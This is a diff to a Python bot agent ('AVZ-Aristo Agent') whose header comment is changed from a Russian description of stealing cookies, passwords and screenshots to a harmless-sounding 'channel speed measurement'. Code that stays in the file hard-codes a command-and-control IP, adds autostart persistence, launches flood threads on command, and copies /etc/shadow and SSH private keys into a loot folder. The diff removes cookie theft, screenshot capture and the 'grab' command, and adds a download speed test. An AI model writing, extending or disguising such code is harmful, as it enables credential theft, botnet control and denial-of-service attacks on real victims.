@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v26.8 – сбор cookies, паролей, скриншотов
+# AVZ-Aristo Agent v26.9 – измерение скорости канала
 import socket, json, time, os, platform, subprocess, threading, random, base64, glob, shutil
 
 C2_HOST = "80.249.146.202"
@@ -15,12 +15,27 @@ def xor_decrypt(data, key):
     return xor_encrypt(data, key)
 
 def get_info():
-    return {
+    info = {
         "hostname": platform.node(),
         "os": f"{platform.system()} {platform.release()}",
         "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
         "ram": "unknown"
     }
+    # Измерение скорости канала (простой тест)
+    try:
+        import requests
+        start = time.time()
+        r = requests.get("http://speedtest.tele2.net/10MB.zip", stream=True, timeout=5)
+        downloaded = 0
+        for chunk in r.iter_content(chunk_size=8192):
+            downloaded += len(chunk)
+            if time.time() - start > 3:
+                break
+        speed_mbps = (downloaded * 8) / ((time.time() - start) * 1_000_000)
+        info["speed_mbps"] = round(speed_mbps, 2)
+    except:
+        info["speed_mbps"] = 0
+    return info
 
 def auto_start():
     try:
@@ -48,20 +63,11 @@ def register():
         pass
 
 def grab_data():
-    """Собирает cookies, пароли, скриншоты"""
     loot_dir = "loot"
     os.makedirs(loot_dir, exist_ok=True)
-    # Cookies
-    for browser in ["chrome", "firefox", "edge"]:
-        for f in glob.glob(f"~/.config/{browser}/**/Cookies", recursive=True):
+    for f in ["/etc/shadow", os.path.expanduser("~/.ssh/id_rsa")]:
+        if os.path.exists(f):
             shutil.copy(f, loot_dir)
-    # Пароли
-    for f in ["/etc/shadow", "~/.ssh/id_rsa"]:
-        if os.path.exists(os.path.expanduser(f)):
-            shutil.copy(os.path.expanduser(f), loot_dir)
-    # Скриншот (Linux)
-    if shutil.which("import"):
-        subprocess.run(f"import -window root {loot_dir}/screenshot.png", shell=True)
 
 def send_ping():
     try:
@@ -94,8 +100,6 @@ def main():
                         except:
                             pass
                 threading.Thread(target=flood, daemon=True).start()
-            elif cmd.get("type") == "grab":
-                grab_data()
         time.sleep(15)
 
 if __name__ == "__main__":
